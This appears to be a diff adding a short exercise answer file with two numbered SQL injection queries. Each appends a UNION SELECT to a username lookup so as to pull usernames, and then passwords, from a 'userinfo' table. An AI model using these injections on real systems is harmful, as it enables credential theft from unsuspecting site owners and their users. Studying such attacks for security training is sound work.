@@ -1,0 +1,5 @@
+# 1)
+SELECT Email FROM userinfo WHERE Username='' UNION SELECT Username FROM userinfo WHERE ''=''
+
+# 2)
+SELECT Email FROM userinfo WHERE Username='' UNION SELECT Password FROM userinfo WHERE ''=''
